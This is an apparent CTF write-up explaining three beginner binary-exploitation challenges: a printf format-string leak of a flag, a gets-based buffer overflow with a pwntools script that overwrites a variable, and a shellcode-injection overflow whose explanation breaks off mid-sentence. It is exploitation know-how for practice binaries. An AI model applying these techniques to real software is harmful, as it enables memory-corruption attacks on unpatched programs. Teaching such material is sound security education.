# PWN : Detailed binary exploitation writeup 
I have created a simple writeup about the four tasks I completed in the CTF.
all these tasks involve basic binary exploitation vulnerabilities , you just need to identify the vulnerability and how to exploit it.
There are no stripped binaries or anything complex , everything is straightforward.
## First challenge ( Warmup ) : simple format string vulnerability
In this task, you are provided with a simple binary. If you try to reverse it and dig a little deeper, you will find something interesting.
```C
      printf("Tell me your secret >> ");
      fgets(local_228,0x108,stdin);
      iVar1 = strncmp(local_228,local_118,0x108);
      if (iVar1 == 0) break;
      printf(local_228);
```
The function printf() doesn't specify the type of the variable that it's going to print. In this case, we have a format string vulnerability, allowing us to leak data from the stack.
```C
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("The flag.txt file does not exist, please create it");
    uVar2 = 0xffffffff;
  }
```
Additionally, we have read the flag from the server and stored it in memory, so it's possible to leak the flag from memory.

## Second challenge ( Baby BOF ) : Buffer overflow to overwrite variable value
first of all we have to check the binary if the mitigations are enabled :
```console
checksec babybof
[*] '/home/elmentos/Desktop/Romdhan_CTF_TASKS/BabyBOF(Done)/to_host/babybof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
In this case, the buffer overflow protection is disabled, so let's dig deeper and see how we can exploit this to solve the challenge.
After reversing the binary with ghidra we have found :
```C
  char local_38 [44];
  int local_c;
  setup();
  local_c = 0x1337;
  puts(
      "*---------------------------------------------------------------x1NF3RN0x-------------------- ---------------------------------------*"
      );
  puts(
      "*-------They told me that there are new pwn learners in this CTF, so I made this as an intro to buffer overflow---------------------*"
      );
  puts(
      "*-------Show me what you can do, and I will tell you my secret. Good luck!<3----------------- ---------------------------------------*"
      );
  printf("*-------Tell me the secret of the Spark Vault locker ^-^ : ");
  gets(local_38);
  if (local_c == 0x1338) {
    puts("You won :),that was easy right !!!!!!!! \n");
    puts("Here is my secret :\n");
    system("/bin/cat flag.txt");
```
Here, we have a variable called local_38 declared with a size of 44 bytes. The issue is that there is no user input control for the length of local_38, so we can overflow the memory. In other words, we can access other memory cells.
!! Don't use gets
so in this challenge we have a variable called local_c intialized with the value 0x1337 , we have to overwrite it with 0x1338 to make the condition true to let the program print the flag .
### First Step : search for the appropriate offest between the input var (local_38) and the local_c in other words we have to search how many bytes to write until we reach the local_c :
don't worry, assembly is easy , you just have to take your time learning it. 
Anyway, here we have, after the printf function:
```asm
   0x0000000000401276 <+89>:	call   0x4010b0 <printf@plt>
   0x000000000040127b <+94>:	lea    rax,[rbp-0x30]
   0x000000000040127f <+98>:	mov    rdi,rax
   0x0000000000401282 <+101>:	mov    eax,0x0
   0x0000000000401287 <+106>:	call   0x4010c0 <gets@plt>
   0x000000000040128c <+111>:	cmp    DWORD PTR [rbp-0x4],0x1338
```
```asm
   0x000000000040127b <+94>:	lea    rax,[rbp-0x30]
```
This instruction saves the address of rbp-0x30 in the register rax. Logically, he is planning to pass the rax register as an argument to the get functions. After that, he is calling the gets function. So here, we can conclude that he is storing the input in rbp-0x30 : 
```asm
   0x000000000040127b <+94>:	lea    rax,[rbp-0x30]
   0x000000000040127f <+98>:	mov    rdi,rax
   0x0000000000401282 <+101>:	mov    eax,0x0
   0x0000000000401287 <+106>:	call   0x4010c0 <gets@plt>
```
And in this part, he is comparing the value that is stored in rbp-0x4 with 0x1338, so we can conclude that the variable we have to overwrite is at the address rbp-0x4 :
```asm
   0x000000000040128c <+111>:	cmp    DWORD PTR [rbp-0x4],0x1338
```
so now lets' calculate the offset between the input ( local_38 ) and the variable we have to overwrite ( local_c ) :
0x30 - 0x4 = 44 (in decimal)
let's craft our payload : 
```python
  padding = b"A" * 44
  payload = padding + p64(0x1338)
```
The padding or the offset + the value we have to overwrite local_c with  in little endian format and size of 8 bytes because we are working with a 64-bit architecture.
```python
  #!/usr/bin/python3
  from pwn import *
  p = process('./babybof')
  padding = b"A" * 44
  print(padding)
  payload = padding + p64(0x1338)
  print(p.clean().decode())
  print(payload)
  print(payload.decode())
  p.sendline(payload)
  print(p.clean())
```
## Third Challenge (Escape the Jail): Buffer Overflow that Leads to Shellcode Injection
as usual, we start by checking the binary security to get an overview of the possible attacks :
```console
checksec escape_the_jail
[*] '/home/elmentos/Desktop/Romdhan_CTF_TASKS/escape_the_jail(Done)/to_host/escape_the_jail'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
Here, the buffer overflow protection is disabled, and NX (which prevents malicious code execution in the stack) is also disabled. In our case, we can execute shellcode and perform a buffer overflow attack. However, we have a minor issue: the addresses are not static, so each time the program executes, the addresses, such as function addresses and variable addresses, will change.
Now let's move on to the next step, which is reversing the binary and checking for vulnerabilities :
```C
  puts("--1 => Help Omran : ");
  puts("--2 => Give up on Omran : ");
  fgets(local_e,2,stdin);
  if (local_e[0] == '1') {
    puts("sorry, bro you have to enter the jail to help me :/ ");
    printf("But Omran left you this : %p \n",local_58);
    puts("Does this look helpful for breaking into the jail? : ");
    do {
      local_c = getchar();
      if (local_c == 10) break;
    } while (local_c != -1);
    gets(local_58);
  }
  else if (local_e[0] == '2') {
    puts("I\'m disappointed bro , Anyway I expected that you could do it ");
    puts("Good bye!!!!!");
  }
```
here is the interseting part the first fgets() he is asking the user to choose to help omran or to give up on him , when you choof to help omran you will find some intersting informations that you have to enter the jail to help omran and in this function  :
```C
    printf("But Omran left you this : %p \n",local_58);
``` 
He is printing back the address of local_58 in the shellcode attack  , this returned address can be interesting , it means that we are going to insert our code in this place and then force the program to jump to that address to execute the shellcode.
let's make sure that local_58 is the place where we are going to inject our shell into it : 
```C
    do {
      local_c = getchar();
      if (local_c == 10) break;
    } while (local_c != -1);
    gets(local_58);
```
Now that we are sure we are going to inject our shellcode into local_58 and then return to force the program to execute the shellcode stored in local_58.
### lets' explain more how we are going to build our payload : 
payload = shell_code + offset + return_address_to_our_shell_code
here the trick is that the offset is not from the local_58 until the return address it's from the shell_code until we reach ret address so the offset = local_58_offset - len(shell_code)
let me explain more : 





